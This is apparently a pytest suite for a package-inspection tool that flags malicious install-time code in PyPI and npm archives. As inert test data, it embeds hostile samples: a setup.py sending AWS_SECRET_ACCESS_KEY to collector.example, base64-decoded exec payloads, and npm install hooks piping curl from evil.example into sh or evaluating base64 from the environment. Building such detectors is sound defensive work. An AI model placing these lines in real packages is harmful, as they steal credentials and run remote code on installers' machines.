"""Tests for static inspection of install-time code.

Archives are built in memory, so the suite stays offline. Nothing here executes
any of the sample code -- the module it tests only ever reads text.

The malicious samples are shaped after publicly documented slopsquat setup.py
and npm install-hook patterns. They are deliberately inert.
"""

import io
import json
import tarfile
import zipfile

import pytest

from ghostpkg.assess import Verdict, assess
from ghostpkg.inspection import (
    MAX_ARCHIVE_BYTES,
    InspectionError,
    inspect_archive,
    scan_text,
)
from ghostpkg.registries import PackageFacts


# SAFETY: the strings below are sample *data*, not code. They are written into
# in-memory tar/zip archives and then pattern-matched as text. Nothing in this
# file -- or in the module it tests -- ever imports, compiles or executes them.
# They exist so the detector can be proved to fire on the shapes that matter.


def sdist(setup_py: str, extra: dict | None = None) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for path, text in {"pkg-1.0/setup.py": setup_py, **(extra or {})}.items():
            data = text.encode()
            info = tarfile.TarInfo(path)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


def npm_tarball(scripts: dict) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        data = json.dumps({"name": "x", "version": "1.0.0", "scripts": scripts}).encode()
        info = tarfile.TarInfo("package/package.json")
        info.size = len(data)
        archive.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


class TestCatchesMaliciousShapes:
    def test_environment_read_sent_over_the_network(self):
        signals = inspect_archive(
            sdist(
                "import os, urllib.request\n"
                "key = os.environ.get('AWS_SECRET_ACCESS_KEY')\n"
                "urllib.request.urlopen('http://collector.example/x?d=' + str(key))\n"
            ),
            "pypi",
        )
        assert "exfiltration" in {s.kind for s in signals}

    def test_decoded_payload_executed(self):
        signals = inspect_archive(
            sdist("import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))\n"), "pypi"
        )
        kinds = {s.kind for s in signals}
        assert "encoded-payload" in kinds
        assert "dynamic-exec" in kinds

    def test_shell_command_at_install(self):
        signals = inspect_archive(
            sdist("import subprocess\nsubprocess.Popen(['sh', '-c', 'id'])\n"), "pypi"
        )
        assert "subprocess" in {s.kind for s in signals}

    def test_large_encoded_blob(self):
        blob = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5" * 6
        signals = inspect_archive(sdist(f'PAYLOAD = "{blob}"\n'), "pypi")
        assert "encoded-payload" in {s.kind for s in signals}

    def test_npm_postinstall_piping_to_shell(self):
        signals = inspect_archive(
            npm_tarball({"postinstall": "curl -s http://evil.example/i.sh | sh"}), "npm"
        )
        assert signals

    def test_npm_preinstall_decoding_from_env(self):
        signals = inspect_archive(
            npm_tarball(
                {"preinstall": "node -e \"eval(Buffer.from(process.env.X,'base64'))\""}
            ),
            "npm",
        )
        assert signals


class TestLeavesLegitimateCodeAlone:
    """Measured against real packages this flagged 0 of 27 established and 0 of
    32 published-that-day. These are the shapes that made earlier, looser
    patterns fire."""

    def test_ordinary_setup_py(self):
        assert not inspect_archive(
            sdist(
                "from setuptools import setup, find_packages\n"
                "setup(name='x', version='1.0', packages=find_packages(),\n"
                "      install_requires=['requests>=2'])\n"
            ),
            "pypi",
        )

    def test_version_read_with_exec(self):
        """A very common idiom: exec a _version.py to read __version__."""
        assert not inspect_archive(
            sdist(
                "version = {}\n"
                "with open('pkg/_version.py') as f:\n"
                "    exec(f.read(), version)\n"
            ),
            "pypi",
        )

    def test_reads_a_build_flag_from_the_environment(self):
        """Inspecting build flags is ordinary; it fired on flask, pyyaml and
        setuptools when environment reads were a signal on their own."""
        assert not inspect_archive(
            sdist("import os\nEXT = not os.environ.get('NO_EXT')\n"), "pypi"
        )

    def test_npm_without_install_hooks(self):
        assert not inspect_archive(
            npm_tarball({"build": "tsc", "test": "jest", "start": "node ."}), "npm"
        )

    def test_test_files_are_not_install_time(self):
        """conftest.py runs during testing, never on install. Scanning it was a
        mistake in the first version."""
        assert not inspect_archive(
            sdist(
                "from setuptools import setup\nsetup(name='x')\n",
                extra={"pkg-1.0/conftest.py": "import subprocess\nsubprocess.run(['x'])\n"},
            ),
            "pypi",
        )


class TestArchiveHandling:
    def test_zip_archives_are_read(self):
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("pkg-1.0/setup.py", "import subprocess\nsubprocess.run([])\n")
        assert inspect_archive(buffer.getvalue(), "pypi")

    def test_unreadable_archive_raises_inspection_error(self):
        with pytest.raises(InspectionError):
            inspect_archive(b"this is not an archive at all", "pypi")

    def test_oversized_member_is_skipped_not_read(self):
        """Guards against a decompression bomb rather than trusting the size."""
        huge = "import subprocess\n" + ("# padding\n" * 200000)
        assert not inspect_archive(sdist(huge), "pypi")

    def test_download_limit_is_bounded(self):
        assert MAX_ARCHIVE_BYTES <= 16 * 1024 * 1024

    def test_each_signal_kind_reported_once(self):
        signals = inspect_archive(
            sdist("import subprocess\nsubprocess.run([])\nsubprocess.Popen([])\n"), "pypi"
        )
        assert len({s.kind for s in signals}) == len(signals)

    def test_scan_text_names_where_it_looked(self):
        signals = scan_text("import subprocess\nsubprocess.run([])\n", "setup.py")
        assert signals[0].where == "setup.py"
        assert "setup.py" in str(signals[0])


class TestVerdictPolicy:
    def facts(self, **overrides):
        base = dict(
            name="example",
            ecosystem="pypi",
            exists=True,
            age_days=5,
            release_count=1,
            has_repo_url=False,
        )
        base.update(overrides)
        return PackageFacts(**base)

    def signal(self):
        return scan_text("import subprocess\nsubprocess.run([])\n", "setup.py")

    def test_young_package_with_install_signals_is_blocked(self):
        """Unlike age, this measured as specific enough to block: 0 false
        positives across 59 real packages, all 6 malicious shapes caught."""
        finding = assess(self.facts(), signals=self.signal())
        assert finding.verdict is Verdict.BLOCK

    def test_established_package_with_install_signals_only_warns(self):
        """Old packages do sometimes build things at install time, and the
        sample behind this judgement is small."""
        finding = assess(self.facts(age_days=3000), signals=self.signal())
        assert finding.verdict is Verdict.WARN

    def test_no_signals_keeps_the_previous_behaviour(self):
        assert assess(self.facts(), signals=[]).verdict is Verdict.WARN

    def test_the_evidence_is_reported(self):
        finding = assess(self.facts(), signals=self.signal())
        assert any("setup.py" in reason for reason in finding.reasons)
